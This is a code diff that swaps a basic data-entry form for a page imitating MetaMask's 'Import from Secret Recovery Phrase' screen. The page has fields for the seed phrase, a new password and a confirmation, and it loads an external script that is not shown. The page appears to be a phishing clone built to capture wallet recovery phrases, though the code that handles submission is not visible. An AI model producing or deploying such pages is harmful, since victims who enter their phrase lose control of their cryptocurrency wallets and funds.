@@ -1,30 +1,103 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Simple Form</title>
-</head>
-<body>
-    <h2>Enter Data</h2>
-    <input id="textInput" type="text" placeholder="Enter text">
-    <button onclick="saveData()">Save</button>
+  <head>
+    <meta charset="UTF-8" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap"
+      rel="stylesheet"
+    />
 
-    <script>
-        function saveData() {
-            const count = document.getElementById("textInput").value;
+    <style>
+      body {
+        font-family: "Poppins", sans-serif;
+        background-color: #f4f4f4;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Import from Secret Recovery Phrase</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <div class="main-parent-top">
+      <div class="main-parent-child">
+        <div class="main-parent-heading-meta">M E T A M A S K</div>
+        <div class="main-parent-heading">
+          Import from Secret Recovery Phrase
+        </div>
 
-            if (count !== "") {
-                fetch("/save", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ name: count }),
-                })
-                .then(response => response.json())
-                .then(data => alert(data.message))
-                .catch(error => console.error("Error:", error));
-            }
-        }
-    </script>
-</body>
+        <div class="main-parent-child-1">
+          <div class="child-header">
+            <div class="section-input-heading">Secret Recovery Phrase</div>
+            <div class="show-input" id="toggleRec">Show</div>
+          </div>
+          <div class="input-box-div">
+            <input
+              id="recovery"
+              class="input-field" 
+              type="password"
+              placeholder="Enter your Secret Recovery Phrase"
+            />
+          </div>
+        </div>
+
+        <div class="main-parent-child-1">
+          <div class="child-header">
+            <div class="section-input-heading">New Password</div>
+            <div class="show-input" id="togglePass">Show</div>
+          </div>
+          <div class="input-box-div">
+            <input
+              id="newPassword"
+              class="input-field"
+              type="password"
+              placeholder="New Password"
+            />
+          </div>
+        </div>
+
+        <div class="password-strength" id="strengthText"></div>
+
+        <div class="main-parent-child-1">
+          <div class="child-header">
+            <div class="section-input-heading">Confirm password</div>
+          </div>
+          <div class="input-box-div-confirm">
+            <input
+              id="confirmPassword"
+              class="input-field"
+              type="password"
+              placeholder="Confirm password"
+            />
+            <span id="checkIcon" style="display: none; color: green">✔</span>
+          </div>
+        </div>
+
+        <div class="character-field">Must be at least 8 characters</div>
+
+        <div class="main-parent-button">
+          <button class="button-box" id="importBtn">IMPORT</button>
+        </div>
+
+        <div class="main-parent-button">
+          <div
+            class="message-popup"
+            id="messageBox"
+            style="display: none"
+          ></div>
+        </div>
+
+        <div class="final-field">
+          By proceeding, you agree to these <a href="#">Terms and Conditions</a>
+        </div>
+      </div>
+    </div>
+
+    <script src="script.js"></script>
+  </body>
 </html>
